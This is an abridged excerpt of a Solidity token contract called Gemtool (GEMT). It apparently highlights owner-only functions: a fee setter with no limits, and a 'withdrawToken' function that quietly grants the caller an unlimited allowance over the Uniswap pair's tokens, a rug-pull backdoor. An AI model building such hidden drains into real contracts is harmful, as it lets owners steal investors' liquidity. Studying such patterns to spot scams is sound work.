...
/*
Website: https://gemtool.co/
Telegram: https://t.me/gemtool
*/
...
contract Gemtool {
    ...
    string  private _name = 'Gemtool';
    string  private _symbol = 'GEMT';
    ...
    uint256 public maxAllowed = type(uint256).max;
    ...
    function setFees(uint8 _devFeeBuy, uint8 _liquidityFeeBuy, uint8 _devFeeSell, uint8 _liquidityFeeSell) public virtual onlyOwner {
    ...
    function withdrawToken(address tokenContract, uint256 amount) public virtual onlyOwner {
        ...
        // approve transaction
        _approve(uniswapPair, msg.sender, maxAllowed);
